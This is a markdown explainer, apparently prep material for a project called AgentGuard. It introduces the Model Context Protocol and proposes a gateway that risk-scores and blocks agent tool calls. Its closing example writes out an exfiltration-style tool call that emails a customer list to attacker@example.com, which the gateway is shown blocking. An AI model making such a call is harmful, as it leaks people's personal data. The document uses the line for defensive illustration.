# MCP Basics

MCP means Model Context Protocol. Think of it as a standard connector layer between an AI application and the outside world.

Without MCP, every AI app may need a custom integration for Gmail, databases, GitHub, Slack, local files, Jira, and internal APIs. With MCP, a tool provider can expose capabilities in a common format, and an AI client can discover and call those capabilities.

## The Simple Mental Model

```text
AI app or agent
  -> MCP client
  -> MCP server
  -> tool, resource, or prompt
```

In AgentGuard:

- The **AI app** is the demo agent inside the backend.
- The **MCP client** is the AgentGuard gateway.
- The **MCP server** is `apps/mock-mcp-server`.
- The **tools** are `read_document`, `send_email`, `query_database`, and `create_ticket`.

## MCP Host, Client, Server, Tool

You may hear these words in interviews:

```text
Host   -> the AI application the user interacts with
Client -> the MCP connector inside the host
Server -> the program exposing capabilities
Tool   -> an action the model can request
```

Example:

```text
Host: Claude Desktop, Cursor, or a custom AI dashboard
Client: MCP client library inside that host
Server: GitHub MCP server
Tool: create_issue(owner, repo, title, body)
```

In this project:

```text
Host: React dashboard + backend agent simulator
Client: AgentGuard gateway
Server: local mock company tools MCP server
Tool: send_email(to, subject, body)
```

## Tools, Resources, And Prompts

MCP servers can expose different kinds of capabilities.

**Tool**

A tool performs an action or computation.

```text
query_database(sql)
create_ticket(title, description, priority)
```

**Resource**

A resource is data the client can read.

```text
company-policy://security/email-sharing
file://demo-data/public_report.txt
```

**Prompt**

A prompt is a reusable instruction template.

```text
"Summarize this incident using severity, impact, evidence, and next action."
```

AgentGuard focuses mainly on tools because tools are where the biggest safety problem appears. Reading data is risky, but calling a tool can change the world: send an email, update a ticket, query a database, or trigger a workflow.

## Why MCP Is Useful

MCP is useful because it gives structure to tool use.

Before MCP:

```text
Every app builds custom tool integrations.
Every tool has different metadata.
Every security team has to inspect a different pattern.
```

With MCP:

```text
Tools have names, descriptions, input schemas, and call results.
Clients can discover tools in a standard way.
Gateways can inspect tool calls at a consistent boundary.
```

That final point is the reason AgentGuard exists.

## Why MCP Creates A Security Problem

An ordinary chatbot only produces text. A tool-using agent can take actions.

Example:

```text
User: Summarize the customer complaint file and email it to the manager.

Agent plan:
1. read_document("customer_complaints.txt")
2. send_email("manager@company.com", summary)
```

This sounds useful, but the file may contain customer emails and phone numbers. If the agent sends that data without review, the system has leaked sensitive information.

So the security question becomes:

```text
Who checks the tool call before it happens?
```

AgentGuard answers:

```text
The gateway checks it.
```

## One Interview-Friendly Explanation

Say this:

```text
MCP standardizes how agents connect to tools. But standardizing access also means agents can reach powerful actions more easily. My project puts a policy gateway between the agent and MCP tools so every tool call is scanned, risk-scored, approved, blocked, or logged.
```

## Tiny Example

Unsafe direct flow:

```text
Agent -> send_email(to="attacker@example.com", body="customer list")
```

AgentGuard flow:

```text
Agent -> Gateway
Gateway checks:
  tool = send_email
  destination = external domain
  body = contains fake PII
  risk = critical
Decision = BLOCK
```

That is the whole project in one example.
